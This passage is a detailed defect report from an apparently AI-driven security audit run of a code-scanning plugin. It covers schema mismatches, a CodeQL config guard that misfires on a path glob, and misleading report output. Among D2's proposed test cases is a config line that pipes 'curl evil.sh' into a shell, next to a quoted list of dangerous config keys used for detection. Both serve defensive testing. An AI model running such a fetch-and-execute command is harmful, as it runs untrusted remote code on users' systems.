# sec-overlay — defect report from a real audit run

**Date:** 2026-09-01
**Reporter:** audit run driven by Claude Code (Opus 5), operator Christopher Bischoff
**Command:** `/sec-overlay:audit` (single repo)
**Target:** `/Users/christopher/Documents/Code/ufe` @ `aef2060896d10c5a53276afe4f0ae69000cd1032`
(browser-only React/TypeScript pnpm monorepo, ~36k `.ts`/`.tsx` files, no server code)
**Plugin path:**
`~/.claude/plugins/marketplaces/cjbischoff-claude-code-tools/plugins/sec-overlay/skills/sec-overlay`
Referred to below as `<SKILL>`. Helpers root `<SKILL>/helpers` referred to as `<HELPERS>`.

**Run outcome:** the audit **completed all 28 phases**, but only after three separate blocker
halts (D1, D2, D11) and one operator-applied workaround (vendoring semgrep rules, D3). Final
tally: 54 shipping findings from 954 candidates — **1 `fixed`** (machine-verified patch),
53 `needs-deployment-testing`, 222 rejected with citations, 2 duplicates.

The defects below are grouped by when they bite:

- **Blockers that halted the run** — D1, D2, D11. Each required an operator decision to get
  past; two were prompt-vs-contract contradictions where an agent following its own
  instructions produced output the Python layer rejects.
- **Silent coverage loss** — D2 (measured: cost 53 confirmations), D3, D22.
- **Report defects** — D14, D15, D16, D17, D18, D19, D24. Collectively these make `report.md`
  the least trustworthy artifact of the run, which matters because it is the one a human
  actually reads. Every one was found by the harness's own `artifact-review` phase or by
  orchestrator verification, and none was fixable by that phase's only remedy (D20).
- **Methodology** — D13, D21, D23, D25.
- **Friction** — D4 through D10, D12.

**Reading note:** this report was written incrementally during the run, so entries are in
discovery order rather than severity order. D13 appears after D25 for that reason. The summary
table below is the authoritative index.

**Environment (not defects — recorded for repro):** `semgrep`, `rg`, `codeql` (all query
packs incl. `javascript`), `ast-grep`, `osv-scanner` present. `tree-sitter` and `gitleaks`
absent (both marked optional by preflight). macOS 25.6.0 / darwin, CPython 3.13.12 via `uv`.

---

## Severity legend

| Tier | Meaning |
|---|---|
| **Blocker** | Halts the run. Operator cannot complete an audit without editing plugin code. |
| **High** | Run continues, but coverage or evidence quality is silently reduced. |
| **Medium** | Wrong or misleading output an operator may act on. |
| **Low** | Friction, docs, or hygiene. |

---

## D1 — `ScanProfile` rejects `dependency_sinks`, a field the recon prompt orders recon to write

**Severity:** Blocker
**Component:** `<HELPERS>/sec_overlay/profile.py`, `<SKILL>/agents/recon.md`,
`<SKILL>/references/scan-profile.schema.json`

### What happened

Recon followed its own prompt and wrote `"dependency_sinks": []` at the top level of
`kb/scan-profile.json`. The next phase crashed:

```
File "<HELPERS>/sec_overlay/profile.py", line 70, in from_dict
    return cls(**d)
TypeError: ScanProfile.__init__() got an unexpected keyword argument 'dependency_sinks'
```

Full stack: `run.py:227 drive` → `driver.py:503 run_audit` → `driver.py:102
run_deterministic_phase` → `driver.py:231 _act_prefilter` → `driver.py:226 _load_profile` →
`profile.py:123 load_profile` → `profile.py:70 from_dict`.

### Why it happens — a three-way contract split

Three artifacts disagree about whether `dependency_sinks` exists.

1. **The prompt mandates it.** `<SKILL>/agents/recon.md:75-78`:

   > Read `references/dependency-sinks.json`. For every entry whose `package` appears in a
   > manifest of the target, include the entry's `cls` in `attack_surface` and record
   > `{"id": …, "package": …, "sink": …, "safe_option": …}` in `dependency_sinks`.

2. **The schema omits it.** `<SKILL>/references/scan-profile.schema.json` — `properties`
   lists `languages, frameworks, entrypoints, runnable, attack_surface, sast_plan,
   agents_to_spawn, budget_hint, attack_surface_evidence, subsystems, notes, scan_options,
   route_summary`. No `dependency_sinks`. There is no `additionalProperties: false`, so a
   schema validator would *pass* the profile that the dataclass then rejects.

3. **The dataclass rejects it.** `profile.py:52-64` declares the 13 fields. `from_dict`
   (`profile.py:68-70`) does `cls(**d)`, so any extra key raises `TypeError`. The docstring
   at `profile.py:69` states this is intentional: *"unknown keys rejected by the dataclass"*.

`validate_profile` (`profile.py:80-105`) checks required fields and types but **never checks
for unknown keys**, so `load_profile` passes validation at line 121 and then explodes at
line 123. The validator that exists to produce good error messages does not catch the one
error class that actually occurs.

### Impact

Any target that declares a `references/dependency-sinks.json` package — i.e. any Go repo
with `github.com/open-policy-agent/opa`, `cel-go`, `starlark`, `goja`, `gopher-lua`, or any
Python repo with `jinja2` — makes a compliant recon agent write a profile that hard-crashes
the next phase. This target matched nothing (no `go.mod`, no `requirements.txt`), so the
crash came from an *empty* `[]`, which means it fires on **every** target, matched or not,
whenever recon follows the prompt literally.

### Failure mode is worse than the crash

An agent that hits this will likely do what this run did: delete the key to get moving. On a
Go target that silently discards the dependency-sink findings the prompt worked to produce.
The absence rule packs (`<HELPERS>/rules/absence/go-policy-engines.yaml`,
`python-templates.yaml`) exist specifically to consume that signal.

### Suggested fix

Add the field to the dataclass and the schema:

```python
# profile.py, after route_summary
dependency_sinks: list[dict] = field(default_factory=list)
```

Separately, make `validate_profile` report unknown keys as a validation error rather than
letting `from_dict` raise a bare `TypeError` two lines later. A field-name typo in a
hand-written profile currently produces a stack trace, not a message.

### Workaround applied in this run

Removed the key from `kb/scan-profile.json`. Preserved the content as prose under
`notes.dependency_sinks` so the record survives.

---

## D2 — CodeQL trust guard substring-matches `setup` inside a path glob

**Severity:** Blocker
**Component:** `<HELPERS>/sec_overlay/codeql.py:18-48`

### What happened

```
RuntimeError: prefilter: planned backend(s) did not run — codeql: untrusted,
codeql: untrusted codeql config: dangerous CodeQL config field 'setup' in
codeql-config-pr.yml. A partial scan is a coverage hole, not 'no findings'.
```

### Why it happens

`codeql.py:18`:

```python
_DANGEROUS = ("extractor", "buildcommand", "build-command", "setup",
              "pre-build", "post-build", "prebuild", "postbuild")
```

`codeql.py:42-48`:

```python
    text = path.read_text(errors="ignore").lower()
    for token in _DANGEROUS:
        if token in text:
            return False, f"dangerous CodeQL config field '{token}' in {path.name}"
```

`token in text` is an unanchored substring test over the whole lowercased file. The target's
config contains, at `.github/codeql/codeql-config-pr.yml:13` and
`.github/codeql/codeql-config.yml:11`:

```yaml
paths-ignore:
  - '**/jest.setup.*'
```

`"setup" in text` → `True`. The guard's docstring (`codeql.py:23-28`) states the threat it
defends: *"an attacker-controlled CodeQL config (custom extractor, build hooks, external
query refs) is an arbitrary-code-execution vector."* That threat requires a `setup:` **key**.
A glob inside `paths-ignore` is a value and cannot execute anything.

### Manual verification performed

Both config files in the target were read in full. Neither contains `extractor`,
`build-command`, `setup`, or any `pre-/post-build` key, and neither contains a `uses:` ref.
The only matches for the token set across `.github/codeql/` are the two `jest.setup.*` globs
above. The false positive is confirmed, not assumed.

### Impact

Hard blocker with no configuration escape hatch. `run_prefilter` is strict by default
(`prefilter.py:311` → `_raise_on_incomplete_backends` at `prefilter.py:65`), so an
untrusted-config verdict raises rather than degrades. The operator's only options are to
edit plugin source, or set `codeql.run: false` in the profile and accept the coverage gap.

The coverage lost is not marginal. Per `<SKILL>/references/prompt-constants.md` §
EVIDENCE_VOCABULARY, `codeql` is a Tier-1 receipt and `ripgrep`/`ast-grep`/`structural-index`
are Tier-2, and *"a finding whose only receipts are Tier-2 cannot reach `confirmed` — route
it to `needs-deployment-testing`."* On this target, semgrep falls back to
`rules/smoke.yaml` (see D3), so dropping CodeQL removes the only interprocedural taint
engine in the run. Five of the fifteen hunt-list items written by the threat-model phase are
reachability questions that only taint analysis can settle:

| Hunt rank | Question |
|---|---|
| 1 | does the `trustedAuthOrigin` config value reach `postMessage`'s target argument |
| 3 | does stored notification HTML reach `dangerouslySetInnerHTML` bypassing the DOMPurify wrapper on *all* paths |
| 5 | what reaches `literal` in `internal/atlas/src/contract/runIngest.ts:370` (`new Function`) across callers |
| 9 | does report data reach the `innerHTML` writes in `printExportDom.ts:48` |
| 12 | can a caller supply an off-origin `wsUrl` to `useWebsocket.ts:154` |

Item 3 is also a QUALIFIER_PROOF case: the prompt-constants block explicitly forbids an
agent from asserting "sanitized" without checking every path, which is exactly what grep
cannot do.

### Also note

Hitting a *non-security* false positive still routes through `failed`, not `skipped`, and
produces a raw Python traceback rather than an operator-actionable message. See D11.

### Suggested fix

Match the token as a YAML key rather than as a substring:

```python
_DANGEROUS_KEY = {
    token: re.compile(rf"^[ \t]*(?:-[ \t]*)?{re.escape(token)}[ \t]*:", re.MULTILINE)
    for token in _DANGEROUS
}
# ...
    for token, pattern in _DANGEROUS_KEY.items():
        if pattern.search(text):
            return False, f"dangerous CodeQL config field '{token}' in {path.name}"
```

`re` is already imported at `codeql.py:11`. The `uses:` external-query-ref check at
`codeql.py:50-53` needs no change.

Any fix must be tested in **both** directions — the risk of narrowing a security guard is a
guard that stops firing on real hooks:

```python
# must be TRUSTED
"paths-ignore:\n  - '**/jest.setup.*'\n"
# must both be UNTRUSTED
"setup:\n  run: curl evil.sh | sh\n"
"  - build-command: make pwn\n"
```

Consider also parsing the YAML and walking keys, rather than regexing text. That removes the
whole class of bug, at the cost of needing to handle unparseable YAML as untrusted.

### Workaround applied in this run

The operator declined to patch runtime plugin code. `codeql.run` was set to `false` with the
reason recorded in `kb/scan-profile.json`, and the audit completed without it.

### MEASURED COST (added after the run completed)

This is the part worth sending upstream, because the gap is now quantified rather than
predicted.

| Metric | Value |
|---|---|
| Findings surviving to the end of validation | 54 |
| Reachable per the trace phase | 51 |
| Reached `status: confirmed` | **1** |
| Stuck at `needs-deployment-testing` | **53** |
| Findings the `patch` phase was allowed to fix (scope is `confirmed` only) | **1** |

The single `confirmed` finding (`C-CMDI-0004`, CI command injection) got there because it
carried a **semgrep** Tier-1 receipt from the prefilter. Every other finding — including a
verified end-to-end DOM-XSS chain in the shared router, three stored-XSS routes, and an
unverified-signature JWT path — was traced to a real untrusted entry point by hand and still
could not be confirmed, because `validate.md:84-88` and EVIDENCE_VOCABULARY require a Tier-1
receipt and the only one capable of proving interprocedural reachability is `codeql:`.

The knock-on effect is larger than the label. `agents/patch.md:11` scopes the patch phase to
`status == "confirmed"`, so **one** finding received a machine-verified fix. Three more were
patched only because the orchestrator explicitly extended the scope out-of-contract and
labelled the diffs `patch:unverified-proposal`; `sec_overlay/verify.py:353` skips any
non-confirmed finding, so those three will never be machine-verified.

So a single unanchored substring match in `codeql.py:46` cost this audit 53 confirmations and
50-plus machine-verified patches. That is the argument for fixing D2 first.

---

## D3 — Vendored semgrep rules are absent; preflight's default invocation says MISSING but exits 0

**Severity:** High
**Component:** `<HELPERS>/sec_overlay/preflight.py:17-23`, `:44-48`, `:171-209`

### What happened

`<HELPERS>/rules/` contains only:

```
rules/README.md
rules/smoke.yaml
rules/absence/go-policy-engines.yaml
rules/absence/python-templates.yaml
```

There is no `rules/semgrep/` directory at all. Per `agents/recon.md:70`, recon should set
`rulesets` to `["rules/semgrep/<lang>"]` per detected language and *"fall back to
`["rules/smoke.yaml"]` only if no vendored dir exists."* The fallback fired, so this
36k-file TypeScript repo was planned for `rules/smoke.yaml` + `rules/absence`.

`rules/absence` ships only Go and Python packs. Neither applies to a TS/JS target. So the
entire semgrep contribution for this run reduces to `smoke.yaml`.

### Why the state is easy to miss

`default_rules_dir()` (`preflight.py:17-23`) returns `<HELPERS>/rules/semgrep` — the dir that
does not exist. `semgrep_rules_present` (`preflight.py:67-79`) returns `False` for it. So the
default invocation is correct:

```
$ uv run python -m sec_overlay.preflight
  [MISSING] vendored semgrep rules
Run these to complete setup (nothing is installed automatically):
  git clone --depth 1 https://github.com/semgrep/semgrep-rules skills/sec-overlay/helpers/rules/semgrep
```

Three problems around that correct output:

1. **The exit code is wrong.** `main` returns `1` at `preflight.py:207` when
   `rep["commands"]` is non-empty. The observed shell exit was **0**. `main` is invoked via
   `raise SystemExit(main())` at `preflight.py:213`, so this needs investigation —
   possibly `uv run` swallowing the code, possibly a wrapper. Either way an operator or CI
   gate keying on exit status sees a pass while rules are missing.

2. **A plausible operator invocation reports a false OK.** `preflight_report` takes
   `rules_dir` as a parameter and `semgrep_rules_present` does `base.rglob("*.yaml")`. Passing
   `--rules-dir rules` (the obvious guess, and what this run tried first) globs
   `smoke.yaml` and the two absence packs and prints `[OK] vendored semgrep rules`. This run
   was misled by exactly that for several minutes.

3. **The install command path is unrunnable as printed.** `_VENDOR_CMD`
   (`preflight.py:45-47`) hardcodes `skills/sec-overlay/helpers/rules/semgrep`, a
   plugin-repo-root-relative path. The comment at `preflight.py:49` acknowledges this
   (*"repo-root-relative for human manual use"*), but an operator running from `<HELPERS>`
   — the CWD every other documented command uses — creates
   `<HELPERS>/skills/sec-overlay/helpers/rules/semgrep` and the problem persists silently.

### Impact

Silent quality degradation, not a crash. Combined with D2 the run has no meaningful SAST at
all: no CodeQL, and semgrep reduced to a smoke ruleset. Every candidate would then rest on
Tier-2 receipts and be unable to reach `confirmed`.

### Suggested fix

- Ship the vendored rules with the plugin, or make preflight's missing-rules state a hard
  failure the driver refuses to run past, rather than a printed suggestion.
- Emit `_VENDOR_CMD` as an absolute path derived from `default_rules_dir()`.
- Verify the exit code actually propagates.
- Have `run_prefilter` warn when a target's language has no matching vendored dir and the
  plan silently fell back to `smoke.yaml`. Right now that fallback is invisible in the run
  output.

---

## D4 — `security_fix_commits` keyword set matches on substrings, returning mostly non-security commits

**Severity:** Medium
**Component:** `<HELPERS>/sec_overlay/githist.py:13-16`

### What happened

`agents/recon.md:105-110` instructs recon to mine git history for security fixes. Running it
on this target:

```python
from sec_overlay.githist import security_fix_commits
security_fix_commits('/Users/christopher/Documents/Code/ufe')
```

returned entries including:

```
feat(auto): let federated guest module steps provide summary for Atlas step panel (#56374)
feat(performance): add Boot Time & Logon Time Atlas page templates (#56545)
feat(tcm): add CredentialEditor Atlas component (#57084)
feat(easm): true CVSS/EPSS score ranking for findings pages on TDS 4.5 (#57049)
feat(experience-atlas-viz): add SEV Risk Summary KPI panel Atlas component
```

None is a security fix.

### Why it happens

`githist.py:13-16`:

```python
_SECURITY_GREP = (
    r"CVE-|vuln|security|exploit|injection|traversal|overflow|"
    r"XSS|CSRF|SSRF|RCE|sanitize|escape|auth bypass|privilege"
)
```

Passed to `git log --grep=… -E -i` at `githist.py:29-30`. Two amplifying causes:

- **No word boundaries.** With `-i`, `RCE` matches inside `sou**rce**`, `resou**rce**`,
  `enfo**rce**`. `vuln` matches `vulnerability` legitimately, but `RCE` inside `source`
  dominates a frontend repo's commit log.
- **Domain-word collision.** This target is a *security product*. Commits about rendering
  CVE/CVSS data, KEV dashboards, and vulnerability tables are product features, not fixes.
  `CVE-` is anchored by its hyphen and behaves; bare `vuln` and `security` do not.

The function correctly returns `[]` on repos without the pattern, as documented. The problem
is precision, not recall.

### Impact

`notes.githist_seeds` fills with noise. An investigate agent following those seeds spends
budget reading feature commits. The prompt frames this as *"cheap; empty on repos without
the pattern"* — cheap to run, but not cheap to consume downstream.

### Suggested fix

Anchor the short acronyms with `\b`, and consider weighting `fix(`/`security` co-occurrence
over a bare keyword hit:

```python
r"CVE-|\bvuln|\bsecurity\b|\bexploit|\binjection\b|\btraversal\b|\boverflow\b|"
r"\bXSS\b|\bCSRF\b|\bSSRF\b|\bRCE\b|\bsanitiz|\bescap(e|ing)\b|auth bypass|\bprivilege"
```

A second, cheaper improvement: prefer commits whose subject starts with a `fix`-class
conventional-commit type when the repo uses them.

---

## D5 — `run_prefilter` turns a tool-config false positive into an unhandled traceback

**Severity:** Medium
**Component:** `<HELPERS>/sec_overlay/prefilter.py:65`, `:311`; `<HELPERS>/sec_overlay/driver.py:102`

### What happened

Both D1 and D2 surfaced to the operator as raw Python stack traces through `drive()`. For
D2 the terminal output was ~20 lines of frames ending in:

```
RuntimeError: prefilter: planned backend(s) did not run — codeql: untrusted, codeql:
untrusted codeql config: dangerous CodeQL config field 'setup' in codeql-config-pr.yml.
A partial scan is a coverage hole, not 'no findings'.
```

### Why it matters

The strictness is right — the message text itself argues correctly that a partial scan is a
coverage hole. The *delivery* is wrong for a phase-driving CLI whose other output is
structured (`NEXT AGENT PHASE:` blocks with substitution tables). The error also duplicates
the backend name (`codeql: untrusted, codeql: untrusted codeql config: …`), which reads as a
formatting bug in the join at `prefilter.py:65`.

There is also no way to distinguish, from the message alone, between:

- the guard correctly refusing a genuinely hostile config, and
- the guard misfiring on a benign one.

Both produce identical output. An operator's only recourse is to read `codeql.py` and audit
the target config by hand, which is what this run did.

### Suggested fix

- Catch `RuntimeError` in `run_deterministic_phase` (`driver.py:102`) and render it as a
  bordered operator message with the remediation options, matching the `NEXT AGENT PHASE`
  style.
- Deduplicate the backend prefix in the joined reason string.
- For the untrusted-config case specifically, print the offending **line** from the config
  file, not just the token and filename. `codeql-config-pr.yml:13: - '**/jest.setup.*'`
  would have made this a five-second diagnosis instead of a fifteen-minute one.

---

## D6 — `advance()` returns silently, giving no confirmation a phase closed

**Severity:** Low
**Component:** `<HELPERS>/sec_overlay/run.py:230-252`

The documented close-a-phase call is:

```bash
uv run python -c "from sec_overlay.run import advance; advance('<repo>', '<phase>')"
```

`advance` returns the receipt `Path` (`run.py:252`) but the documented invocation discards
it and prints nothing. Three phases were closed in this run with zero terminal output each
time. The only way to confirm a stage recorded is to re-run `drive` and see whether it
advances, or to read `state.json`.

Contrast `drive`, which the same doc wraps in `print(...)`.

**Suggested fix:** wrap the documented call in `print(...)` in `<SKILL>/commands/audit.md`,
or have `advance` print a one-line confirmation (`recorded stage 'recon' → receipt <path>`).

---

## D7 — The command doc's `cd` path does not resolve from any plausible CWD

**Severity:** Low
**Component:** `<SKILL>/commands/audit.md` (the `/sec-overlay:audit` command body)

The doc says:

```
cd plugins/sec-overlay/skills/sec-overlay/helpers
uv run python -c "from sec_overlay.run import drive; …"
```

That relative path resolves only from the marketplace-repo root. Invoked as a slash command
the CWD is the user's project (`/Users/christopher/Documents/Code/ufe`), where it fails. This
run had to locate the plugin with `find ~/.claude -type d -name sec-overlay`, which returns
three candidates:

```
~/.claude/plugins/cache/cjbischoff-claude-code-tools/sec-overlay
~/.claude/plugins/marketplaces/cjbischoff-claude-code-tools/plugins/sec-overlay
~/.claude/plugins/marketplaces/cjbischoff-claude-code-tools/openwiki/plugins/sec-overlay
```

Only the second has `skills/sec-overlay/helpers`. Nothing in the doc says which to pick.

**Suggested fix:** have the command emit the absolute helpers path (the plugin runtime knows
its own install root), or document the `find`/resolution rule and which candidate is canonical.

---

## D8 — `uv run` materializes a `.venv` inside the plugin install directory

**Severity:** Low
**Component:** `<HELPERS>/pyproject.toml` + the documented `uv run` invocation

First `drive` call printed:

```
Using CPython 3.13.12
Creating virtual environment at: .venv
Building sec-overlay @ file:///…/plugins/sec-overlay/skills/sec-overlay/helpers
Installed 8 packages in 45ms
```

`<HELPERS>/.venv` now exists inside the marketplace checkout (confirmed:
`drwxr-xr-x 8 christopher staff 256 Aug 31 21:30 .venv`). A plugin update that does a clean
checkout or a `git clean` will either destroy it (forcing a silent rebuild mid-audit) or
trip on it as an untracked directory.

**Suggested fix:** set `UV_PROJECT_ENVIRONMENT` to a path outside the plugin tree, add
`.venv/` to the plugin's ignore rules, or ship the helpers as an installed package rather
than a source tree built in place.

---

## D9 — Prompt/schema drift beyond D1: `agents/recon.md` names outputs the contract does not model

**Severity:** Low (docs), but it is the root cause pattern behind D1
**Component:** `<SKILL>/agents/recon.md` vs `<SKILL>/references/scan-profile.schema.json`
vs `<HELPERS>/sec_overlay/profile.py`

`dependency_sinks` (D1) is the instance that crashed, but the same three-way ownership split
governs every profile field, and nothing enforces agreement. Observations from this run:

- The schema has no `additionalProperties: false`, so schema validation cannot catch an
  extra key that the dataclass will reject.
- `validate_profile` (`profile.py:80-105`) checks required-and-typed but not unknown-key.
- `recon.md:112-121` correctly warns recon *not* to emit `route_summary` because the recall
  gate derives it. That is the right pattern — an explicit do-not-write note — and it is
  applied to exactly one field.

**Suggested fix:** add a test that asserts every field name mentioned as an output in
`agents/recon.md` exists in both `scan-profile.schema.json` and `ScanProfile`. The repo
already has precedent for this style of consistency test — `tests/test_references_caps.py`
keeps `mermaid-caps.md` in sync with `diagram_gate.py`.

---

## D11 — `agents/investigate.md` mandates `cls: "logic-chain"`, which the findings gate rejects

**Severity:** Blocker (halted the run at the `findings-gate` phase)
**Component:** `<SKILL>/agents/investigate.md:235-239` vs the canonical class list consumed by
`<HELPERS>/sec_overlay/driver.py:274` (`_act_findings_gate`)

### What happened

An investigation finding was written with `cls: "logic-chain"` exactly as the prompt
instructs. The findings gate halted the run:

```
sec_overlay.driver.PhaseHalt: findings-gate rejected 1 finding(s):
LOGIC-CHAIN-0001: cls 'logic-chain' is not a canonical attack class
(see references/attack-classes.md)
```

### Why it happens

`agents/investigate.md:235-239` sanctions the value in an explicitly-named exception:

> **logic-chain exception:** a single finding MAY span 2–3 files as a multi-primitive
> chain (e.g. auth-bypass → IDOR → RCE) — the sanctioned exception to one-class-per-finding.
> Use `cls: "logic-chain"`, record each primitive as a `dataflow` hop across the files, and
> describe the composed capability in `message`.

`references/attack-classes.md` does not list `logic-chain` among its canonical keys, and the
findings gate validates `cls` against that list. So the prompt mandates a value the gate
refuses. This is the same prompt-vs-contract drift as D1 and D9, but it fires later in the
pipeline, after investigation work is already complete.

### Impact

A multi-primitive chain finding — the highest-value output an investigator can produce,
since it composes what single-class agents each see only half of — cannot be recorded in the
form the prompt prescribes. The failure surfaces only at the gate, after the analysis is
done, so the cost is paid before the error is visible.

### Suggested fix

Add `logic-chain` to the canonical class list (and to `attack-classes.md`), or remove the
exception from `investigate.md`. Either is fine; the two must agree. Prefer adding it — the
exception exists for a real reason and the alternative loses chain findings entirely.

### Workaround applied in this run

Re-classed to `cls: "xss"` and re-id'd `LOGIC-CHAIN-0001` → `XSS-0004`, chosen because the
chain's terminal sink is stored XSS. No analysis changed; the chain remains in `dataflow`.
The original file is preserved at
`<workspace>/artifacts/LOGIC-CHAIN-0001.original.json` and the re-class is recorded in the
finding's `history` under event `forced-reclass`.

---

## D12 — `agents/investigate.md` documents four attack-context fields the `Finding` model does not declare

**Severity:** Low (non-fatal; keys are preserved)
**Component:** `<SKILL>/agents/investigate.md:212-221` vs `<HELPERS>/sec_overlay/models.py`

### What happened

Every finding that used the documented optional attack-context fields produced a warning on
load, ~28 of them per driver invocation:

```
warning: preserving unknown keys on CONTEXT-BLEED-0001.json: attacker, exact_request, exfil_channels, privilege
warning: preserving unknown keys on XSS-0001.json: attacker, exfil_channels, privilege
```

### Why it happens

`investigate.md:212-221` defines these as first-class optional output:

> ### Attack-context fields (optional, evidence-gated)
> Add these four keys to a finding when the evidence you already read supports them.
> - `attacker` — a string. Name who reaches the source.
> - `privilege` — a string. Name the privilege the attacker needs.
> - `exact_request` — a string. Give the exact request that reaches the sink.
> - `exfil_channels` — an array of strings. Name each channel that returns data.
>
> The report renders each present key as its own section.

The `Finding` dataclass declares none of them, so the loader treats all four as unknown.
Unlike D1 this degrades gracefully — the keys are preserved rather than raising — but the
prompt claims "the report renders each present key as its own section", which cannot be true
for a field the model does not model. Worth confirming whether the report actually renders
them or silently drops them.

### Impact

Log noise on every load, and likely-unrendered content that agents spent effort producing.
An agent following the prompt correctly is told its output is malformed.

### Suggested fix

Declare the four fields on `Finding`, or drop the section from the prompt. Same consistency
test proposed in D9 would catch this: assert every field name the agent prompts name as
output exists on the model.

---

## D14 — `report.md` omits the verified patch, renders a stale status, and points at a section that does not exist

**Severity:** High (the audit's single machine-verified fix is invisible in the deliverable)
**Component:** `<HELPERS>/sec_overlay/report.py`

### What happened

`C-CMDI-0004` — the only finding in the run that reached a terminal fixed state — is on disk as:

```
status: fixed | verification: verified-static | patch_diff: 1082 chars
```

The `verify` phase applied the diff to a throwaway tree copy, re-scanned, confirmed the
semgrep rule no longer fires, and promoted the finding. `report` runs AFTER `verify` in
`PHASE_TABLE`. Yet `report.md` says:

```
| C-CMDI-0004 | 6 | ... | internal/cli-localization/src/utils/files.ts:48 | confirmed | apply fix (§ below) |
```

Three separate problems in one row:

1. **Stale status.** Rendered as `confirmed`; disk says `fixed`. Either report.py reads a
   pre-verify snapshot or it has no branch for `FindingStatus.FIXED`.
2. **Dangling cross-reference.** The next-action cell says "apply fix (§ below)". There is no
   such section. `grep '^## ' report.md` yields: Triage, Detail, Dropped findings, Position
   review required, Reflection retractions, Reflection skipped, Review source skipped,
   Coverage completeness, Run economics. No patch/fix section exists.
3. **The patch itself is absent.** `grep -c 'execFileSync' report.md` returns **0**, though
   the verified diff (`execSync` → `execFileSync` with an argv array) is stored in the
   finding's `patch_diff`. The one fix this audit machine-verified is not shown to the reader.

### Impact

The most valuable single output of the pipeline — a fix that was generated, applied, and
mechanically re-scanned — cannot be found in the report. A reader following the report's own
instruction ("apply fix (§ below)") lands nowhere. They would have to know to open
`findings/C-CMDI-0004.json` and read the raw `patch_diff` field.

### Suggested fix

Render `patch_diff` for any finding that has one, in a dedicated section, and add a
`FindingStatus.FIXED` branch to the status renderer with a next-action of "fix verified —
review and merge" rather than "apply fix". Also make the "(§ below)" link generation
conditional on the target section actually being emitted.

---

## D15 — The route census floods `report.md` with unfiltered non-shipping routes: 89% of the report is noise

**Severity:** High (renders the coverage table unusable, which defeats its purpose)
**Component:** `<HELPERS>/sec_overlay/report.py` coverage-completeness section +
the `route-census` phase

### What happened, measured

| Metric | Value |
|---|---|
| Total lines in `report.md` | 1,486 |
| Lines that are route-census `needs_follow_up` rows | **1,314 (88.4%)** |
| Distinct route follow-up entries | 1,299 |
| …of which from `internal/ufe-dev-server` (a mirage/miragejs MOCK server that never ships) | **171** |
| …of which from `.test.` / `.spec.` / `__mocks__` / `__fixtures__` / `e2e/` / `.stories.` | **291** |
| Real findings in the same report | 54 |

So 1,299 follow-up items surround 54 findings, and at minimum 462 of those items (36%) are
provably not shipped code.

### Why it happens

The route census enumerates route-shaped constructs with no shipped-vs-non-shipped filter,
and the report emits every census route the findings do not mention as a `needs_follow_up`
row with boilerplate remediation text ("report '<route>' in the route section or record why
it is out of scope"). Two failure modes compound:

1. **No exclusion of non-production trees.** `internal/ufe-dev-server` is a miragejs mock
   used only by `pnpm launch`; its routes are fixtures. Sample rows:
   `ALL deviceRetirementAction (…/internal/ufe-dev-server/src/module-server/provision/routes/deviceRetirement.ts:165)`,
   `ALL mdmFileVaultKey (…/internal/ufe-dev-server/src/module-server/enforce/routes/mdmFileVault.ts:21)`.
   Note recon already recorded the shipped/non-shipped split in
   `kb/scan-profile.json` `subsystems` (there is a `build-and-developer-tooling` subsystem
   naming exactly these paths) — the census does not consult it.
2. **Parser false positives.** Some rows are not routes at all. Two rows read
   `GET fixed (…/packages/workbench-pulsar/src/features/Console/components/PageLayout/packItems.test.ts:101)`
   — the census matched the literal word `fixed` in a test file and emitted it as an HTTP
   route named "fixed".

### Impact

A coverage table with 1,299 rows, a third of them provably irrelevant, will be skipped
wholesale by any human reader — which destroys the value of the genuine coverage signal
buried inside it. It also inflates the report to 757 KB, making it impractical to read or
diff. The route-coverage mechanism is a good idea (it catches routes the audit never looked
at); the absence of a filter makes it counterproductive.

### Suggested fix

1. Filter the census against the non-shipping path set before emitting follow-ups. Recon
   already computes this; reuse `scan-profile.json` `subsystems` or add an explicit
   `notes.non_shipping_paths`.
2. Anchor the route-extraction patterns so a bare identifier like `fixed` in a test file
   cannot be classified as a route with method `GET`.
3. Cap and summarise: emit the top N uncovered routes plus a count, rather than every row.
   Per the harness's own "no silent caps" principle, state the number dropped.

---

## D16 — The `Coverage completeness` table asserts "no finding" for 13 classes that shipped findings

**Severity:** High (a false claim about the run's own output, in the section a reader consults
to judge coverage)
**Component:** `<HELPERS>/sec_overlay/report.py` coverage-completeness renderer

Found by the `artifact-review` phase, verified by the orchestrator.

13 of the 15 attack-surface rows in `## Coverage completeness` (report.md:157-170) state
`no terminal finding for this attack surface this pass` for classes that demonstrably DID
ship findings: `xss`, `dom-xss`, `expr-eval-rce`, `authn`, `jwt`, `authz`,
`open-redirect-client`, `crypto`, `graphql`, `prompt-injection`, `mcp-trust-inheritance`,
`context-bleed`, `business-logic`. The Triage table ~150 lines earlier in the same document
lists 4 xss, 7 authz, 7 authn and 3 jwt findings. Only `cswsh` and `excessive-agency` are
genuinely empty.

A reader who trusts this section concludes the audit found nothing in thirteen classes it
actually found 40-plus findings in. Suggested fix: join the surface table against shipping
findings by `cls` before rendering the "no terminal finding" text.

---

## D17 — `report.md` embeds 3,897 absolute local filesystem paths, violating the harness's own PATH_BASE rule

**Severity:** Medium (leaks the auditor's local layout into a shareable deliverable; breaks
path portability)
**Component:** `<HELPERS>/sec_overlay/report.py` coverage-completeness renderer

`references/prompt-constants.md` § PATH_BASE is explicit: *"cite every file reference
repo-root-relative (relative to `{{REPO_ROOT}}`), never scan-scope-relative and never a bare
basename."*

`report.md` contains **3,897** occurrences of `/Users/christopher/Documents/Code/ufe/`, across
1,299 of the 1,316 coverage rows. `report.sarif` is clean (all 54 `artifactLocation` URIs
repo-relative) and all 54 per-finding pages are clean, so the defect is confined to the
coverage renderer. Fix: apply the same repo-relative normalisation the SARIF writer already
uses.

---

## D18 — `report.md` discloses none of the run's material coverage caveats, including that CodeQL never ran

**Severity:** High (the reader cannot calibrate the result)
**Component:** `<HELPERS>/sec_overlay/report.py`

`grep -c codeql report.md` → **0**. The report never tells its reader that no
interprocedural taint receipt exists for any finding — which is the *sole* reason 53 of 54
findings route to `needs-deployment-testing` rather than `confirmed`.

Also undisclosed, though all recorded in `kb/investigate-coverage-notes.md`:

- the 737 candidates trimmed by operator decision before investigation (the only `prefilter`
  string in the report is a timing number)
- `cswsh` left UNASSESSED with 6 named uncovered `useWebsocket` callers
- the mis-scoped threat-model row T1, and two diagrams knowingly left inaccurate
- that 5 findings' reachability is deferred to `open_questions` rather than settled

A section titled `Coverage completeness` that spends 736 KB on route bookkeeping (D15) and
zero bytes on these caveats inverts the reader's priorities exactly.

Suggested fix: render `kb/investigate-coverage-notes.md`-class caveats, or any
`notes`/`scan_plan` disabled-backend reason, into a short, prominent Limitations section. The
